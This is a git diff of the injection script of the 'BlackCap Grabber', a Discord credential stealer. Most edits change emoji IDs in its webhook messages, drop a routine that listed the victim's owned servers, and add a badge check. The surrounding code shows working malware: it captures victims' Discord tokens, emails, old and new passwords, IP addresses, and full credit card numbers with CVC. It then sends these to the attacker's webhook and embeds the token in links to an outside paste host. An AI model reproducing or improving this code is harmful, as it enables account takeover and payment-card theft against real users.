@@ -277,42 +277,42 @@ async function FirstTime() {
                         content: "",
                         embeds: [{
                             title: "BlackCap Initalized",
-                            description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                            description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
                                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                 inline: !1
 								}, {
-                                name: "Username <:icon4:1024615934519955496> ",
+                                name: "Username <:username:1041634536733290596> ",
                                 value: `\`${b.username}#${b.discriminator}\``,
                                 inline: !0
 								}, {
-                                name: "ID <:icon3:1024615933228109834>",
+                                name: "ID <:iduser:1041634535395307520>",
                                 value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                 inline: !0
 								}, {
-                                name: "Badges <:icon5:1024615931869147146>",
+                                name: "Badges <:badge:1041634538150973460>",
                                 value: `${GetBadges(b.flags)}`,
                                 inline: !0
 								}, {
-                                name: "Language <:language:1037057832920547398>",
+                                name: "Language <:language:1041640473477001236>",
                                 value: `${GetLangue(b.locale)}`,
                                 inline: !0
 								}, {
-                                name: "NSFW <a:nsfw:1037067109907320883>",
+                                name: "NSFW <a:nsfw:1041640474617839616>>",
                                 value: `${GetNSFW(b.nsfw_allowed)}`,
                                 inline: !1
 								}, {
-                                name: "A2F <a:a2f:1037084050826997902>",
+                                name: "A2F <a:a2f:1040272766982692885>",
                                 value: `${GetA2F(b.mfa_enabled)}`,
                                 inline: !0
 								}, {
                                 name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                                 inline: !0
 								}, {
-                                name: "Token <a:icon1:1024615171907407892>",
+                                name: "Token <a:tokens:1041634540537511957>>",
                                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                 inline: !1
 								}],
@@ -383,38 +383,38 @@ async function FirstTime() {
                                 content: "",
                                 embeds: [{
                                     title: "BlackCap Victim got logged out",
-                                    description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
                                         value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                         inline: !1
 								}, {
-                                        name: "Username <:icon4:1024615934519955496> ",
+                                        name: "Username <:username:1041634536733290596> ",
                                         value: `\`${b.username}#${b.discriminator}\``,
                                         inline: !0
 								}, {
-                                        name: "ID <:icon3:1024615933228109834>",
+                                        name: "ID <:iduser:1041634535395307520>",
                                         value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                         inline: !0
 								}, {
-                                        name: "Badges <:icon5:1024615931869147146>",
+                                        name: "Badges <:badge:1041634538150973460>",
                                         value: `${GetBadges(b.flags)}`,
                                         inline: !0
 								}, {
-                                        name: "NSFW <a:nsfw:1037067109907320883>",
+                                        name: "NSFW <a:nsfw:1041640474617839616>>",
                                         value: `${GetNSFW(b.nsfw_allowed)}`,
                                         inline: !1
 								}, {
-                                        name: "A2F <a:a2f:1037084050826997902>",
+                                        name: "A2F <a:a2f:1040272766982692885>",
                                         value: `${GetA2F(b.mfa_enabled)}`,
                                         inline: !0
 								}, {
                                         name: "@Copyright",
-                                        value: `[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                                         inline: !0
 								}, {
-                                        name: "Token <a:icon1:1024615171907407892>",
+                                        name: "Token <a:tokens:1041634540537511957>>",
                                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                         inline: !1
 								}],
@@ -488,31 +488,6 @@ async function getFromURLnp(url, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );`, !0)
     return b
-}
-
-
-
-async function getservers(token) {
-    var guilds = await getFromURL("https://discord.com/api/v8/users/@me/guilds", token)
-    await guilds.filter(a => a.owner == true && a.icon).forEach(async a => {
-        if (a.icon == null) return
-        let blackcapedidguild = a.id;
-        saveidtofile(blackcapedidguild, "blackcaped_guilds_ids.txt");
-    });
-    setTimeout(async () => {
-        if (fs.existsSync('blackcaped_guilds_ids.txt')) {
-            const guild_id = await fs.readFileSync('blackcaped_guilds_ids.txt', 'utf-8').split("\n");
-            guild_id.forEach(async id => {
-                setTimeout(async () => {
-                    if (id == null || id == "\n" || id == " ") return;
-                    var b = await getFromURL(`https://discord.com/api/v8/guilds/${id}/preview`, token)
-                    if (100 > b.approximate_member_count) return
-                    if (b.name == "undefined") return
-                    saveidtofile(`---------------------------\n+ Name: ${b.name}\n+ ID: ${b.id}\n+ Members: ${b.approximate_member_count}\n\n`, "blackcaped_guilds_result.txt");
-                }, 2000);
-            });
-        }
-    }, 2000)
 }
 
 
@@ -731,6 +706,7 @@ function GetBadges(flags) {
     const Early_Supporter = 512;
     const Bug_Hunter_Level_2 = 16384;
     const Early_Verified_Bot_Developer = 131072;
+    const Discord_Active_Developer = 4194304;
     var badges = "";
     if ((flags & Discord_Employee) == Discord_Employee) {
         badges += "<:staff:874750808728666152> "
@@ -761,6 +737,9 @@ function GetBadges(flags) {
     }
     if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
         badges += "<:developer:874750808472825986> "
+    }
+    if ((flags & Discord_Active_Developer) == Discord_Active_Developer) {
+        badges += "<:activedev:1041634224253444146> "
     }
     if (badges == "") {
         badges = "None"
@@ -845,58 +824,58 @@ async function Login(email, password, token) {
                 content: "",
                 embeds: [{
                     "title": "BlackCap User Login",
-                    description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
                         value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                         inline: !1
 												}, {
-                        name: "Username <:icon4:1024615934519955496> ",
+                        name: "Username <:username:1041634536733290596> ",
                         value: `\`${info.username}#${info.discriminator}\``,
                         inline: !0
 												}, {
-                        name: "ID <:icon3:1024615933228109834>",
+                        name: "ID <:iduser:1041634535395307520>",
                         value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                         inline: !0
 												}, {
-                        name: "Nitro <a:_diamond:1018223518913150977>",
+                        name: "Nitro <a:nitro:1041639670288748634>",
                         value: `${GetNitro(info.premium_type)}`,
                         inline: !0
 												}, {
-                        name: "Badges <:icon5:1024615931869147146>",
+                        name: "Badges <:badge:1041634538150973460>",
                         value: `${GetBadges(info.flags)}`,
                         inline: !0
 												}, {
-                        name: "Language <:language:1037057832920547398>",
+                        name: "Language <:language:1041640473477001236>",
                         value: `${GetLangue(info.locale)}`,
                         inline: !0
 												}, {
-                        name: "NSFW <a:nsfw:1037067109907320883>",
+                        name: "NSFW <a:nsfw:1041640474617839616>>",
                         value: `${GetNSFW(info.nsfw_allowed)}`,
                         inline: !1
 												}, {
-                        name: "A2F <a:a2f:1037084050826997902>",
+                        name: "A2F <a:a2f:1040272766982692885>",
                         value: `${GetA2F(info.mfa_enabled)}`,
                         inline: !0
 												}, {
                         name: "@Copyright",
-                        value: `[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                         inline: !0
 												}, {
-                        name: "Billing <a:icon8:1024619392652288071>",
+                        name: "Billing <a:billing:1041641103629234196>",
                         value: `${Cool()}`,
                         inline: !1
 												}, {
-                        name: "Email <a:Email:1024615399314161744>",
+                        name: "Email <a:email:1041639672037785691>",
                         value: `\`${email}\``,
                         inline: !0
 												}, {
-                        name: "Password <a:icon6:1024617637390598164>",
+                        name: "Password <a:password:1041639669047238676>",
                         value: `\`${password}\``,
                         inline: !0
 												}, {
-                        name: "Token <a:icon1:1024615171907407892>",
+                        name: "Token <a:tokens:1041634540537511957>>",
                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                         inline: !1
 												}, ],
@@ -908,7 +887,7 @@ async function Login(email, password, token) {
                         "url": `${usericonurl}`
                     }
 											}, {
-                    "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
+                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                     "color": config['embed-color'],
                     "description": CalcFriends(),
 
@@ -1001,62 +980,62 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 content: "",
                 embeds: [{
                     "title": "BlackCap Detect Password Changed",
-                    description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
                         value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                         inline: !1
 												}, {
-                        name: "Username <:icon4:1024615934519955496> ",
+                        name: "Username <:username:1041634536733290596> ",
                         value: `\`${info.username}#${info.discriminator}\``,
                         inline: !0
 												}, {
-                        name: "ID <:icon3:1024615933228109834>",
+                        name: "ID <:iduser:1041634535395307520>",
                         value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                         inline: !0
 												}, {
-                        name: "Nitro <a:_diamond:1018223518913150977>",
+                        name: "Nitro <a:nitro:1041639670288748634>",
                         value: `${GetNitro(info.premium_type)}`,
                         inline: !0
 												}, {
-                        name: "Badges <:icon5:1024615931869147146>",
+                        name: "Badges <:badge:1041634538150973460>",
                         value: `${GetBadges(info.flags)}`,
                         inline: !0
 												}, {
-                        name: "Language <:language:1037057832920547398>",
+                        name: "Language <:language:1041640473477001236>",
                         value: `${GetLangue(info.locale)}`,
                         inline: !0
 												}, {
-                        name: "NSFW <a:nsfw:1037067109907320883>",
+                        name: "NSFW <a:nsfw:1041640474617839616>>",
                         value: `${GetNSFW(info.nsfw_allowed)}`,
                         inline: !1
 												}, {
-                        name: "A2F <a:a2f:1037084050826997902>",
+                        name: "A2F <a:a2f:1040272766982692885>",
                         value: `${GetA2F(info.mfa_enabled)}`,
                         inline: !0
 												}, {
                         name: "@Copyright",
-                        value: `[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                         inline: !0
 												}, {
-                        name: "Billing <a:icon8:1024619392652288071>",
+                        name: "Billing <a:billing:1041641103629234196>",
                         value: `${Cool()}`,
                         inline: !1
 												}, {
-                        name: "Email <a:Email:1024615399314161744>",
+                        name: "Email <a:email:1041639672037785691>",
                         value: `\`${info.email}\``,
                         inline: !1
 												}, {
-                        name: "<a:icon6:1024617637390598164> Old Password",
+                        name: "<a:password:1041639669047238676> Old Password",
                         value: `\`${oldpassword}\``,
                         inline: !0
 												}, {
-                        name: "<a:icon6:1024617637390598164> New Password",
+                        name: "<a:password:1041639669047238676> New Password",
                         value: `\`${newpassword}\``,
                         inline: !0
 												}, {
-                        name: "Token <a:icon1:1024615171907407892>",
+                        name: "Token <a:tokens:1041634540537511957>>",
                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                         inline: !1
 												}, ],
@@ -1068,7 +1047,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         "url": `${usericonurl}`
                     }
 											}, {
-                    "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
+                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                     "color": config['embed-color'],
                     "description": CalcFriends(),
 
@@ -1165,58 +1144,58 @@ async function ChangeEmail(newemail, password, token) {
                 content: "",
                 embeds: [{
                         "title": "BlackCap Detect Email Changed",
-                        description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                        description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                         "color": config['embed-color'],
                         "fields": [{
                                 name: "Injection Info",
                                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                 inline: !1
 					}, {
-                                name: "Username <:icon4:1024615934519955496> ",
+                                name: "Username <:username:1041634536733290596>",
                                 value: `\`${info.username}#${info.discriminator}\``,
                                 inline: !0
 					}, {
-                                name: "ID <:icon3:1024615933228109834>",
+                                name: "ID <:iduser:1041634535395307520>",
                                 value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                 inline: !0
 					}, {
-                                name: "Nitro <a:_diamond:1018223518913150977>",
+                                name: "Nitro <a:nitro:1041639670288748634>",
                                 value: `${GetNitro(info.premium_type)}`,
                                 inline: !0
 					}, {
-                                name: "Badges <:icon5:1024615931869147146>",
+                                name: "Badges <:badge:1041634538150973460>",
                                 value: `${GetBadges(info.flags)}`,
                                 inline: !0
 					}, {
-                                name: "Language <:language:1037057832920547398>",
+                                name: "Language <:language:1041640473477001236>",
                                 value: `${GetLangue(info.locale)}`,
                                 inline: !0
 					}, {
-                                name: "NSFW <a:nsfw:1037067109907320883>",
+                                name: "NSFW <a:nsfw:1041640474617839616>>",
                                 value: `${GetNSFW(info.nsfw_allowed)}`,
                                 inline: !1
 					}, {
-                                name: "A2F <a:a2f:1037084050826997902>",
+                                name: "A2F <a:a2f:1040272766982692885>",
                                 value: `${GetA2F(info.mfa_enabled)}`,
                                 inline: !0
 					}, {
                                 name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                                 inline: !0
 					}, {
-                                name: "Billing <a:icon8:1024619392652288071>",
+                                name: "Billing <a:billing:1041641103629234196>",
                                 value: `${Cool()}`,
                                 inline: !1
 					}, {
-                                name: "New Email <a:Email:1024615399314161744>",
+                                name: "New Email <a:email:1041639672037785691>",
                                 value: `\`${newemail}\``,
                                 inline: !0
 					}, {
-                                name: "Password <a:icon6:1024617637390598164>",
+                                name: "Password <a:password:1041639669047238676>",
                                 value: `\`${password}\``,
                                 inline: !0
 					}, {
-                                name: "Token <a:icon1:1024615171907407892>",
+                                name: "Token <a:tokens:1041634540537511957>>",
                                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                 inline: !1
 					},
@@ -1229,7 +1208,7 @@ async function ChangeEmail(newemail, password, token) {
                             "url": `${usericonurl}`
                         }
 				}, {
-                        "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
+                        "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                         "color": config['embed-color'],
                         "description": CalcFriends(),
 
@@ -1259,8 +1238,6 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     var {
         ip
     } = await getFromURL("https://www.myexternalip.com/json", null)
-    await getservers(token)
-    setTimeout(async () => {
         if(b.avatar === null){
             usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
         }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
@@ -1276,18 +1253,18 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     "title": "BlackCap User Credit Card Added",
                     "description": `
                     **IP:** ${ip}\n\n
-                    **Username** <:icon4:1024615934519955496>\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
-                    **ID** <:icon3:1024615933228109834>\n\`\`\`${info.id}\`\`\`\n
-                    **Email** <a:Email:1024615399314161744>\n\`\`\`${info.email}\`\`\`\n
-                    **Nitro Type** <a:_diamond:1018223518913150977>\n${GetNitro(info.premium_type)}\n
-					**Language** <:language:1037057832920547398>\n${GetLangue(info.locale)}\n
-					**A2F** <a:a2f:1037084050826997902>\n${GetA2F(info.mfa_enabled)}\n
-					**NSFW** <a:nsfw:1037067109907320883>\n${GetNSFW(info.nsfw_allowed)}\n
-                    **Badges** <:icon5:1024615931869147146>\n${GetBadges(info.flags)}\n
+                    **Username** <:username:1041634536733290596>\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
+                    **ID** <:iduser:1041634535395307520>\n\`\`\`${info.id}\`\`\`\n
+                    **Email** <a:email:1041639672037785691>\n\`\`\`${info.email}\`\`\`\n
+                    **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(info.premium_type)}\n
+					**Language** <:language:1041640473477001236>\n${GetLangue(info.locale)}\n
+					**A2F** <a:a2f:1040272766982692885>\n${GetA2F(info.mfa_enabled)}\n
+					**NSFW** <a:nsfw:1041640474617839616>>\n${GetNSFW(info.nsfw_allowed)}\n
+                    **Badges** <:badge:1041634538150973460>\n${GetBadges(info.flags)}\n
                     **Credit Card Number**\n\`\`\`${number}\`\`\`\n
                     **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
                     **CVC**\n\`\`\`${cvc}\`\`\`\n
-                    **Token** <a:icon1:1024615171907407892> \n\`\`\`${token}\`\`\``,
+                    **Token** <a:tokens:1041634540537511957>> \n\`\`\`${token}\`\`\``,
                     "author": {
                         "name": "BlackCap"
                     },
@@ -1299,7 +1276,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     },
             },
                 {
-                    "title": `<a:icon10:1024621262766604348> Guilds Owner`,
+                    "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
                     "color": config['embed-color'],
                     "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
 
@@ -1316,9 +1293,6 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ]
         }
         hooker(params)
-        deletefile("blackcaped_guilds_ids.txt")
-        deletefile("blackcaped_guilds_result.txt")
-    }, 10000)
 }
 
 const ChangePasswordFilter = {
